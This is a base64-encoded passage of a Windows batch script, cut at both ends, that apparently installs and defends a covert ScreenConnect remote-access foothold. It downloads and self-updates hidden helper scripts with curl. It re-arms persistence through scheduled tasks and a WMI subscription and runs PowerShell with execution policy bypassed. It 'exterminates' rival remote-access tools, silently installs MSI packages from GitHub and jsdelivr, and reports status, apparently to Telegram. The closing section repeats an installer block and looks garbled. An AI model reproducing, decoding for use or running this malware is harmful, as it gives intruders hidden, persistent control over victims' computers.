LnBzMSIgPm51bCAyPiYxDQpmaW5kc3RyIC9DOiJUR19SRVBPUlQgQlVJTEQiICIlV0QlXHRnX3Jl
cG9ydC5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVdEJVx0Z19yZXBvcnQubmV3Iikg
ZG8gaWYgJSV+ekYgR1RSIDE1MDAgbW92ZSAveSAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJVdEJVx0
Z19yZXBvcnQucHMxIiA+bnVsIDI+JjENCmRlbCAvZiAvcSAiJVdEJVx0Z19yZXBvcnQubmV3IiA+
bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4
IC0tbWF4LXRpbWUgMzAgLW8gIiVXRCVcb3duX3NlY3VyZS5uZXciICIlT1dOU0VDJSIgPm51bCAy
PiYxDQppZiBub3QgZXhpc3QgIiVXRCVcb3duX3NlY3VyZS5uZXciICIlQ1VSTCUiIC1MIC0tY29u
bmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVP
V05TRUMyJSIgPm51bCAyPiYxDQphdHRyaWIgLWggLXMgLXIgIiVXRCVcb3duX3NlY3VyZS5jbWQi
ID5udWwgMj4mMQ0KZmluZHN0ciAvQzoiT1dOX1NFQ1VSRSBCVUlMRCIgIiVXRCVcb3duX3NlY3Vy
ZS5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVdEJVxvd25fc2VjdXJlLm5ldyIpIGRv
IGlmICUlfnpGIEdUUiA4MDAgbW92ZSAveSAiJVdEJVxvd25fc2VjdXJlLm5ldyIgIiVXRCVcb3du
X3NlY3VyZS5jbWQiID5udWwgMj4mMQ0KZGVsIC9mIC9xICIlV0QlXG93bl9zZWN1cmUubmV3IiA+
bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4
IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX2xpYi5uZXciICIlT1dOTElCJSIgPm51bCAyPiYx
DQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10
aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25fbGliLm5ldyIgIiVPV05MSUIyJSIg
Pm51bCAyPiYxDQphdHRyaWIgLWggLXMgLXIgIiVXRCVcb3duX2xpYi5wczEiID5udWwgMj4mMQ0K
ZmluZHN0ciAvQzoiT1dOX0xJQiAgQlVJTEQiICIlV0QlXG93bl9saWIubmV3IiA+bnVsIDI+JjEg
JiYgZm9yICUlRiBpbiAoIiVXRCVcb3duX2xpYi5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBt
b3ZlIC95ICIlV0QlXG93bl9saWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQpk
ZWwgL2YgL3EgIiVXRCVcb3duX2xpYi5uZXciID5udWwgMj4mMQ0KcmVtIHNlbGYtdXBkYXRlOiBk
b3dubG9hZCBuZXcgb3duX21vbiwgYXBwbHkgQUZURVIgdGhpcyB0aWNrIChCVUlMRC12ZXJpZmll
ZCkNCnNldCAiU0VMRl9VUEQ9MCINCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5l
Y3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5uZXh0IiAiJU9XTk1P
TiUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9tb24ubmV4dCIgIiVDVVJMJSIg
LUwgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9tb24ubmV4
dCIgIiVPV05NT04yJSIgPm51bCAyPiYxDQpmaW5kc3RyIC9DOiJPV05fTU9OICBCVUlMRCIgIiVX
RCVcb3duX21vbi5uZXh0IiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgZm9yICUlRiBp
biAoIiVXRCVcb3duX21vbi5uZXh0IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgKA0KICBmYyAvYiAi
JVdEJVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCiAgaWYgZXJy
b3JsZXZlbCAxIHNldCAiU0VMRl9VUEQ9MSINCikNCmlmICIlU0VMRl9VUEQlIj09IjAiIGRlbCAv
ZiAvcSAiJVdEJVxvd25fbW9uLm5leHQiID5udWwgMj4mMQ0KDQpyZW0g4pSA4pSAIFtCXSByZS1h
cm0gY2hhaW4gMTogb3duZXJzaGlwLWF3YXJlIChub3QgZXhpc3RlbmNlLW9ubHkpIOKUgOKUgA0K
cmVtIEwxMS9NMjI6IFF1ZXJ5LW9ubHkgc2tpcHBlZCByZWFybSB3aGVuIFdpbmRvd3MgYnVpbHQt
aW4gdGFza3Mgc2hhcmVkDQpyZW0gZGVmYXVsdCBuYW1lcyAoRGlhZ25vc2lzXFNjaGVkdWxlZCBl
dGMuKSAtPiBtb24gbmV2ZXIgcmFuLCBubyBsb2cuDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
MSIgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5v
UHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVX
RCVcb3duX2xpYi5wczEiIC1BY3Rpb24gdGFza3MtZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtTW9u
UGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyAoDQogICAgZWNobyB0YXNrc19lbnN1cmUgJSVS
Pj4iJUxPRyUiDQogICAgc2V0ICJUQVNLU19FTlNVUkU9JSVSIg0KICApDQopDQppZiBub3QgZXhp
c3QgIiVFVEwlIiBta2RpciAiJUVUTCUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcb3duX21v
bi5jbWQiICgNCiAgYXR0cmliIC1oIC1zIC1yICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYx
DQogIGNvcHkgL3kgIiVXRCVcb3duX21vbi5jbWQiICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAy
PiYxDQopDQoNCnJlbSDilIDilIAgW0IyXSByZS1hcm0gY2hhaW4gMiAoV01JIHN1YnNjcmlwdGlv
bikgaWYgbWlzc2luZyDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmIGV4aXN0ICIlV0Ql
XG93bl9saWIucHMxIiAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiB3YXRjaGRvZy1lbnN1cmUgLVdvcmtE
aXIgIiVXRCUiIC1Nb25QYXRoICIlV0QlXG93bl9tb24uY21kImApIGRvIHNldCAiV0RfU1RBVEU9
JSVSIg0KICBpZiAvSSAiIVdEX1NUQVRFISI9PSJSRUFSTUVEIiBlY2hvIHdhdGNoZG9nIFdNSSBS
RUFSTUVEPj4iJUxPRyUiDQopDQoNCnJlbSDilIDilIAgW0VdIGV4dGVybWluYXRlIGZvcmVpZ24g
U0MgKyBkaXNhbGxvd2VkIFJNTSAoQkVGT1JFIGhlYWwvaW5zdGFsbCwNCnJlbSAgICAgc28gdGhl
IFNDIGluc3RhbGxlciBjdXN0b20gYWN0aW9uIG5ldmVyIGNvbGxpZGVzIHdpdGggcml2YWxzKSDi
lIDilIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
aWIucHMxIiAtQWN0aW9uIGV4dGVybWluYXRlIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4m
MQ0KdGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwNCnNldCAiRk9SRUlHTl9MRUZUPTAiDQpmb3Ig
L2YgInRva2Vucz0yIGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgc3RhdGVePSBhbGwgXnwg
ZmluZHN0ciAvQzoiU0VSVklDRV9OQU1FOiBTY3JlZW5Db25uZWN0IENsaWVudCInKSBkbyAoDQog
IHNldCAiRlA9JSVhIg0KICBzZXQgIkZQPSFGUDogPSEiDQogIGlmIC9JIG5vdCAiIUZQISI9PSIl
S0VFUF9GUCUiIGlmIC9JIG5vdCAiIUZQISI9PSIlQUxUX0ZQJSIgaWYgL0kgbm90ICIhRlAhIj09
IiVHUllYQV9GUCUiICgNCiAgICBzZXQgL2EgQ09VTlQrPTENCiAgICBzZXQgL2EgRk9SRUlHTl9M
RUZUKz0xDQogICAgc2V0ICJGT1JFSUdOX0xJU1Q9IUZPUkVJR05fTElTVCEhRlAhICINCiAgICBl
Y2hvIGZvcmVpZ25fbGVmdF8hRlAhPj4iJUxPRyUiDQogICkNCikNCg0KcmVtIOKUgOKUgCBbQ10g
aGVhbCBTY3JlZW5Db25uZWN0IHByaW0vYWx0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0K
Zm9yIC9mICJ0b2tlbnM9MSwyIGRlbGltcz0oKSIgJSVhIGluICgnc2MgcXVlcnkgIlNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUUiJykg
ZG8gKA0KICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1TVEFURT0lJWIiDQopDQpzYyBx
dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIg
Pm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiUFJJTV9PSz0xIg0KICBzZXQgL2Eg
Q09VTlQrPTENCikNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+
bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0IC9hIENPVU5UKz0xDQpzYyBxdWVyeSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQpp
ZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiQUxUX09LPTEiDQoNCmlmICIlSU5TVEFMTEVEJSI9PSIx
IiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgZWNobyBzdmMgaGVhbCByZXN0YXJ0Pj4iJUxPRyUi
DQogIG5ldCBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4m
MQ0KICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4m
MQ0KICB0aW1lb3V0IC90IDYgL25vYnJlYWsgPm51bA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICBpZiBub3QgZXJy
b3JsZXZlbCAxIHNldCAiUFJJTV9PSz0xIg0KKQ0KcmVtIE0xNjogc3RpbGwgc3RvcHBlZCAtPiBy
ZXBhaXIgdGhlIFJFR0lTVEVSRUQgcHJvZHVjdCAobXNpZXhlYyAvZmEgcmVzdG9yZXMNCnJlbSBi
aW5hcmllcyArIHN0YXJ0cyB0aGUgc2VydmljZTsgTDUgUmVwYWlyLVNDU2VydmljZSBoYW5kbGVz
IHN0b3BwZWQgc3ZjcykNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAi
ICgNCiAgZWNobyBzdmMgZXNjYWxhdGUgcmVwYWlyPj4iJUxPRyUiDQogIGlmIGV4aXN0ICIlV0Ql
XG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFp
ciAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogIHRpbWVv
dXQgL3QgOCAvbm9icmVhayA+bnVsDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
JUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEg
c2V0ICJQUklNX09LPTEiDQopDQpyZW0gTTE2OiBvcnBoYW5lZCBzZXJ2aWNlIGVudHJ5IChwcm9k
dWN0IHVucmVnaXN0ZXJlZCAtIGVhdGVuIGJ5IGFuIFNDLWZhbWlseQ0KcmVtIHVwZ3JhZGUgcmVt
b3ZhbCkgY2FuIE5FVkVSIHN0YXJ0LiBEZWxldGUgaXQgYW5kIGZhbGwgdGhyb3VnaCB0byB0aGUN
CnJlbSBmcmVzaC1pbnN0YWxsIGxhZGRlciBiZWxvdyBpbnN0ZWFkIG9mIGFsZXJ0aW5nICJ3b250
IHN0YXJ0IiBmb3JldmVyLg0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0i
MCIgKA0KICBzZXQgIlJFR1NUQVRFPXVua25vd24iDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIu
cHMxIiBmb3IgL2YgImRlbGltcz0iICUlUiBpbiAoJ3Bvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5w
czEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiJykg
ZG8gc2V0ICJSRUdTVEFURT0lJVIiDQogIGVjaG8gb3JwaGFuX2NoZWNrPSFSRUdTVEFURSE+PiIl
TE9HJSINCiAgaWYgL0kgIiFSRUdTVEFURSEiPT0ibm8iICgNCiAgICBlY2hvIG9ycGhhbl9zZXJ2
aWNlX2RlbGV0ZT4+IiVMT0clIg0KICAgIHNjIGRlbGV0ZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICAgIHNldCAiSU5TVEFMTEVEPTAiDQogICkNCikNCmlm
ICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVN
T05WRVIlIC1FeHRyYSAic3ZjLXdvbnQtc3RhcnQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRl
IERPV04gIlNjcmVlbkNvbm5lY3QgKCVLRUVQX0ZQJSkgaW5zdGFsbGVkIGJ1dCB3b250IHN0YXJ0
Ig0KICBnb3RvIDpBZnRlckhlYWwNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBnb3RvIDpBZnRl
ckhlYWwNCg0KcmVtIOKUgOKUgCBbRF0gcHJpbWFyeSBTQyBtaXNzaW5nIC0gaGVhbCBsYWRkZXIg
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSADQpyZW0gTTEyOiBGSVJTVCByZXBhaXIgdGhlIHJlZ2lzdGVyZWQgcHJvZHVjdCAo
cmVjcmVhdGVzIHNlcnZpY2Ugd2l0aG91dA0KcmVtIHRvdWNoaW5nIHRoZSBBTFQgaW5zdGFuY2Up
OyBmcmVzaCBtc2lleGVjIGluc3RhbGwgb25seSBhcyBmYWxsYmFjay4NCmVjaG8gc3ZjIG1pc3Np
bmcgLSBoZWFsIGJlZ2luPj4iJUxPRyUiDQpjYWxsIDpSZXBhaXJSZWdpc3RlcmVkICIlS0VFUF9G
UCUiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAi
UlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiSU5TVEFMTEVEPTEi
DQogIHNldCAiUFJJTV9PSz0xIg0KICBnb3RvIDpBZnRlckhlYWwNCikNCnJlbSByZWZ1c2UgZnJl
c2ggL2kgaWYgcHJvZHVjdCBzdGlsbCByZWdpc3RlcmVkIC0gVXBncmFkZSB0YWJsZSBjYW4gd2lw
ZSBBTFQvR1JZWEENCnNldCAiUkVHU1RBVEU9dW5rbm93biINCmlmIGV4aXN0ICIlV0QlXG93bl9s
aWIucHMxIiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5v
UHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVX
RCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtE
aXIgIiVXRCUiYCkgZG8gc2V0ICJSRUdTVEFURT0lJVIiDQppZiAvSSAiIVJFR1NUQVRFISI9PSJ5
ZXMiICgNCiAgZWNobyBwcmltYXJ5X3JlZ2lzdGVyZWRfc2tpcF9mcmVzaF9pbnN0YWxsPj4iJUxP
RyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtE
aXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInJlZ2lzdGVyZWQtc3R1Y2siID5udWwg
Mj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIlByaW1hcnkgcmVnaXN0ZXJlZCBidXQgc2Vydmlj
ZSBtaXNzaW5nIC0gL2ZhIGZhaWxlZDsgcmVmdXNlZCAvaSB0byBwcm90ZWN0IEFMVC9HUllYQSIN
CiAgZ290byA6QWZ0ZXJIZWFsDQopDQpyZW0gTzM3OiByZWZ1c2Ugc2V2cnogL2kgd2hlbiBncnl4
YSBhbHJlYWR5IHByZXNlbnQg4oCUIHNoYXJlZCBsZWdhY3kgVXBncmFkZUNvZGVzDQpyZW0gezBD
OTQ0NDhCfS97MUY4NUQ3RkV9IG1ha2Ugc2libGluZyBtc2lleGVjIC9pIGtub2NrIEdyeXhhIE9G
RkxJTkUgaW4gcGFuZWwuDQpzZXQgIkdSRUc9dW5rbm93biINCmlmIGV4aXN0ICIlV0QlXG93bl9s
aWIucHMxIiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5v
UHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVX
RCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVHUllYQV9GUCUiIC1Xb3Jr
RGlyICIlV0QlImApIGRvIHNldCAiR1JFRz0lJVIiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJH
UkVHPXllcyINCmlmIC9JICIhR1JFRyEiPT0ieWVzIiAoDQogIGVjaG8gcHJpbWFyeV9za2lwX2lf
cHJvdGVjdF9ncnl4YT4+IiVMT0clIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAt
QWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJwcm90
ZWN0LWdyeXhhLXNraXAtcHJpbWFyeS1pIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBET1dO
ICJQcmltYXJ5IG1pc3NpbmcgLSByZWZ1c2VkIHNldnJ6IC9pIHRvIHByb3RlY3QgR3J5eGEgKHNo
YXJlZCBTQyBVcGdyYWRlQ29kZXMpOyAvZmEgb25seSINCiAgZ290byA6QWZ0ZXJIZWFsDQopDQpp
ZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9VUkwlIiAibWFpbiIN
CmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1BLRzElP3Q9JVJB
TkRPTSUiICJnaXRodWItcGtnIg0KaWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxN
c2kgIiVNU0lfUEtHMiUiICJqc2RlbGl2ci1wa2ciDQppZiAiJUlOU1RBTExFRCUiPT0iMCIgKA0K
ICByZW0gcHJlZmVyIHdvcmtlci1jYWNoZWQgLnd1Y2FjaGVccGtnLm1zaSAoc2FtZSBiaW5hcnkg
YXMgZGVwbG95KQ0KICBhdHRyaWIgLWggLXMgLXIgIiVNU0lDQUNIRSUiID5udWwgMj4mMQ0KICBm
b3IgJSVGIGluICgiJU1TSUNBQ0hFJSIpIGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgNCiAgICBl
Y2hvIHd1Y2FjaGVfcGtnX3JldHJ5Pj4iJUxPRyUiDQogICAgYXR0cmliIC1oIC1zIC1yICIlTVNJ
JSIgPm51bCAyPiYxDQogICAgY29weSAveSAiJU1TSUNBQ0hFJSIgIiVNU0klIiA+bnVsIDI+JjEN
CiAgKQ0KICBmb3IgJSVGIGluICgiJU1TSSUiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAoDQog
ICAgZWNobyBjYWNoZSByZXRyeSBpbnN0YWxsPj4iJUxPRyUiDQogICAgY2FsbCA6Tm9Nc2lQb2xp
Y3kNCiAgICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJP
T1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0KICAg
IHNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiDQogICAgZWNobyBjYWNoZSBtc2lleGVjIGV4aXQ9
IU1TSUVYSVQhPj4iJUxPRyUiDQogICAgaWYgIiFNU0lFWElUISI9PSIxNjE4IiAoDQogICAgICB0
aW1lb3V0IC90IDMwIC9ub2JyZWFrID5udWwNCiAgICAgIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4g
L25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1z
aV9oZWFsMi5sb2ciID5udWwgMj4mMQ0KICAgICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISIN
CiAgICAgIGVjaG8gY2FjaGVfcmV0cnkxNjE4X2V4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQogICAg
KQ0KICAgIGNhbGwgOldhaXRTdmMNCiAgKQ0KKQ0KY2FsbCA6UmVzdG9yZUFsdA0KY2FsbCA6RW5z
dXJlR3J5eGFNdXN0DQpyZW0gTzQwOiBORVZFUiBtc2lleGVjIGhlcmUg4oCUIGdyeXhhLWVuc3Vy
ZSBsb2NrcyBpZiBhbnkgbm9uLXNldnJ6IFNDIFJ1bm5pbmcuDQpzZXQgIkdSWVhBX09LPTAiDQpp
ZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBzZXQgIkdSRVM9Ig0KICBmb3IgL2YgInVz
ZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
Y3Rpb24gZ3J5eGEtZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiVgKSBkbyBz
ZXQgIkdSRVM9JSVSIg0KICBlY2hvIGdyeXhhX211c3RfbGliPSFHUkVTIT4+IiVMT0clIg0KICBl
Y2hvICFHUkVTIXwgZmluZHN0ciAvSSAvQiAvQzoiSEVBTFRIWSIgPm51bA0KICBpZiBub3QgZXJy
b3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCikNCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIg
Zm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhh
LmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiDQpz
YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmQgIlJVTk5J
TkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUllYQV9PSz0xIg0KaWYgIiVHUllY
QV9PSyUiPT0iMSIgKGVjaG8gZ3J5eGFfbXVzdF9ydW5uaW5nX29rPj4iJUxPRyUiKSBlbHNlIChl
Y2hvIGdyeXhhX211c3Rfc3RpbGxfZG93bj4+IiVMT0clIikNCmV4aXQgL2IgMA0KDQo6SW5zdGFs
bE1zaSAiJU1TSV9VUkwlIiAibWFpbiINCmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxsIDpJbnN0
YWxsTXNpICIlTVNJX1BLRzElP3Q9JVJBTkRPTSUiICJnaXRodWItcGtnIg0KaWYgIiVJTlNUQUxM
RUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtHMiUiICJqc2RlbGl2ci1wa2ciDQpp
ZiAiJUlOU1RBTExFRCUiPT0iMCIgKA0KICByZW0gcHJlZmVyIHdvcmtlci1jYWNoZWQgLnd1Y2Fj
aGVccGtnLm1zaSAoc2FtZSBiaW5hcnkgYXMgZGVwbG95KQ0KICBhdHRyaWIgLWggLXMgLXIgIiVN
U0lDQUNIRSUiID5udWwgMj4mMQ0KICBmb3IgJSVGIGluICgiJU1TSUNBQ0hFJSIpIGRvIGlmICUl
fnpGIEdUUiAxMDAwMDAwICgNCiAgICBlY2hvIHd1Y2FjaGVfcGtnX3JldHJ5Pj4iJUxPRyUiDQog
ICAgYXR0cmliIC1oIC1zIC1yICIlTVNJJSIgPm51bCAyPiYxDQogICAgY29weSAveSAiJU1TSUNB
Q0hFJSIgIiVNU0klIiA+bnVsIDI+JjENCiAgKQ0KICBmb3IgJSVGIGluICgiJU1TSSUiKSBkbyBp
ZiAlJX56RiBHVFIgMTAwMDAwMCAoDQogICAgZWNobyBjYWNoZSByZXRyeSBpbnN0YWxsPj4iJUxP
RyUiDQogICAgY2FsbCA6Tm9Nc2lQb2xpY3kNCiAgICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9u
b3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lf
aGVhbC5sb2ciID5udWwgMj4mMQ0KICAgIHNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiDQogICAg
ZWNobyBjYWNoZSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQogICAgaWYgIiFNU0lF
WElUISI9PSIxNjE4IiAoDQogICAgICB0aW1lb3V0IC90IDMwIC9ub2JyZWFrID5udWwNCiAgICAg
IG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFs
bHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsMi5sb2ciID5udWwgMj4mMQ0KICAgICAgc2V0
ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCiAgICAgIGVjaG8gY2FjaGVfcmV0cnkxNjE4X2V4aXQ9
IU1TSUVYSVQhPj4iJUxPRyUiDQogICAgKQ0KICAgIGNhbGwgOldhaXRTdmMNCiAgKQ0KKQ0KY2Fs
